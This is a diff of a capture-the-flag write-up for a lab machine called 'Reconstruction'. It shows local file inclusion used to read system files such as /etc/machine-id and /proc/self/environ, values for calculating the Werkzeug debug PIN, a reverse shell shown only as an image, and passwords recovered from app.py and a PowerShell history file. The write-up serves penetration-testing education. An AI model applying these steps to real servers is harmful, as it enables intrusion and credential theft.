@@ -1,4 +1,4 @@
-# Reconstruction (WIP)
+# Reconstruction
 
 ## Gaining Access
 
@@ -96,7 +96,7 @@ There were just these 3 directories. `create` is pretty obvious in what it does,
 
 Testing any directories with this shows the same page, but with a new header:
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 The `X-Error` showing `Incorrect Padding` is present, and when googled the first thing that comes up is `base64`:
 
@@ -113,6 +113,8 @@ Now there's an error saying there's no file or directory triggered by the newlin
 Since we have LFI on the Werkzeug server, we can actually calculate the PIN required.&#x20;
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" %}
+
+{% embed url="https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/" %}
 
 Using our LFI, we can get the parameters required. First, we need to get the ARP Address of the machine. First, we can find the ARP cache to identify the interface used:
 
@@ -151,24 +153,77 @@ L2V0Yy9tYWNoaW5lLWlk
 
 <figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
-Then, we can use this script to get the PIN out:
+The machine ID needed some service name appended to the back of it, which we can get from reading `/proc/self/cgroup`.&#x20;
 
-{% embed url="https://gist.github.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42" %}
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-Note that we need to append `blog.service` behind the machineid based on Hacktricks, as well as my own trial and error.
+We also need the user that started the application, which can be found in `/proc/self/environ`:
+
+<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
+
+Afterwards, I tested it a few times, varying the public bits and testing the machine ID with and without `blog.service` appended to the end of it and eventually got it:
+
+```python
+probably_public_bits = [
+    'www-data',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.6/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '345052425031',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    '00566233196142e9961b4ea12a2bdb29'# get_machine_id(), /etc/machine-id
+]
+```
+
+<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+
+From here, we can easily get a reverse shell on our machine.&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+We cannot read the user flag yet.
+
+## Privilege Escalation
+
+### Jack Creds
+
+Within `app.py` for the Flask website, we can find some credentials:
 
 ```
-$ python3 pin.py --uuid 345052426526 --machineid 00566233196142e9961b4ea12a2bdb29blog.service
-[!] App.py base path not provided, trying for most versions of python
-2.7: 105-680-026
-3.0: 203-540-957
-3.1: 144-819-940
-3.2: 179-971-507
-3.3: 136-857-667
-3.4: 332-587-539
-3.5: 282-864-373
-3.6: 498-493-994
-3.7: 508-377-547
-3.8: 141-442-795
+#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'
+ADMIN_PASSWORD = '1edfa9b54a7c0ec28fbc25babb50892e'
 ```
 
+We can `su` to `jack` using the commented password.
+
+<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
+
+### Powershell --> Root Creds
+
+Within the home directory of the user, I enumerated the directories present and noticed that there was a Powershell directory:
+
+```
+jack@reconstruction:~$ ls -la .local/share
+total 12
+drwxr-xr-x 3 root root 4096 Sep 30  2020 .
+drwxr-xr-x 3 root root 4096 Sep 30  2020 ..
+drwxr-xr-x 3 root root 4096 Sep 30  2020 powershell
+```
+
+Obviously this was rather odd. If we read the `ConsoleHost_History.txt` file at the end of it, we find this:
+
+```
+Write-Host -ForegroundColor Green -BackgroundColor White Holy **** this works!
+Write-Host -ForegroundColor Red -BackgroundColor Black Holy **** this works as well!
+su FlauntHiddenMotion845
+clear history
+clear
+cls
+exit
+```
+
+This password can be used to `su` to `root`:
+
+<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
